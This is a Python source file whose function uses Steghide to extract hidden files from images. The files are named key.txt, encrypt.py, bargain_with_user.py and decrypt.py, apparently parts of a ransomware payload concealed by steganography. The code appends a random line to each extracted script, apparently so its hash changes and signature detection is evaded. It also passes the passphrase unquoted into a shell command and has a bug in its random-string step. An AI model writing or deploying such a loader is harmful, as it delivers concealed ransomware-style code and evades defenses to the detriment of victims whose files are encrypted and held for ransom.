import subprocess
import os


def extract_file(cover_file_path: str, passphrase: str):
    """
    Executes commandlines to run Steghide and obtain in order
    to obtain the "secret" message embedded within a given image.
    :param cover_file_path: Represents the path to the image to be examined for a message.
    :param passphrase: The key used to decrypt and access the "secret" message
        in the image.
    :return: The text that was embedded into the provided cover_file.
    """

    steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]

    # TODO: Use the os module to iterate through current directory to find the pathway to steghide.exe if needed
    steghide_path = 'steghide-0.5.1-win32\steghide\steghide.exe'

    # Checks the compatibility of the file type with Steghide
    _, cover_file_type = cover_file_path.split(".")
    if cover_file_type not in steghide_compatible_files:
        raise TypeError("Unsupported file for Steghide detected!")

    with open("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_key: str = lines[0].strip("\n")
        image_containing_encryption_code: str = lines[1].strip("\n")
        image_containing_bargaining_code: str = lines[2].strip("\n")
        image_containing_decryption_code: str = lines[3].strip("\n")

    # Verifies that the needed images are indeed available; to help with testing
    if os.path.exists(cover_file_path):
        pass
    else:
        raise FileNotFoundError(f"The image name/path '{cover_file_path}' does not exist in the current directory."
                                f"Either the name fed to the variable in the code to be updated or the image "
                                f"specified just doesn't exist.")

    # TODO: Make sure the text file being embedded into contains these names
    # TODO: Test with .exe files
    extracted_file: str = ""
    if cover_file_path == image_containing_key:
        extracted_file = "key.txt"
    elif cover_file_path == image_containing_encryption_code:  # our .bmp file containing the logic to encrypt
        extracted_file = "encrypt.py"
    elif cover_file_path == image_containing_bargaining_code:
        extracted_file = "bargain_with_user.py"
    elif cover_file_path == image_containing_decryption_code:  # our .bmp file containing the logic to decrypt
        extracted_file = "decrypt.py"
    else:
        raise FileNotFoundError("Unexpected file name passed as cover file. "
                                "Try updating the name of the variable 'cover_file_path'")

    print("Cover file:", cover_file_path)
    print("File written to:", extracted_file)

    # Represents the commandline argument to be run in Command Prompt in order to extract the embedded message
    command = f'"{steghide_path}" extract -sf "{cover_file_path}" -p {passphrase} -f\n'
    try:
        # Runs Command Prompt in the background from within the venv
        process = subprocess.Popen("cmd.exe",
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   text=True)

        # Inputs the command we want to execute and runs them
        process.stdin.write(command)
        process.stdin.flush()

        # Unpacks 2-tuple and prints out what's occurring within the command prompt itself
        output, errors = process.communicate()

        # Checks if the file being extracted already exists
        if errors == (f'the file "{extracted_file}" does already exist. overwrite ? (y/n) steghide: could not get '
                      f'terminal attributes.\n'):
            raise FileExistsError("NOTICE: You're attempting to overwrite a file that already exists.")
        # Checks if wrong passphrase was inputted
        elif errors == "steghide: could not extract any data with that passphrase!\n":
            raise ValueError("NOTICE: Incorrect passphrase inputted")
        # The subprocess must have run without error
        else:
            # Reads the contents of the file and prints them in the console
            with open(extracted_file, "r") as file:
                contents: str = file.read()
            import random
            # Generates a random string consisting of 30 random ASCII characters
            rand_generated_str: str = ""
            for _ in range(30):
                rand_generated_str += random.choice(ascii.__str__())
            # Appends randomized string to end of executable file
            with open(extracted_file, "a") as file:
                file.writelines(f"\nprint('{rand_generated_str}')")

            print("\nExtraction Successful with:\n" + contents + "\n")

    # Catches any errors that happen to occur
    except FileNotFoundError as fnfe:
        print(f"The file {fnfe.filename} was not found anywhere!")
        return
    except Exception as e:
        print(e)
        return

    # Returns the embedded code in a string format
    return contents
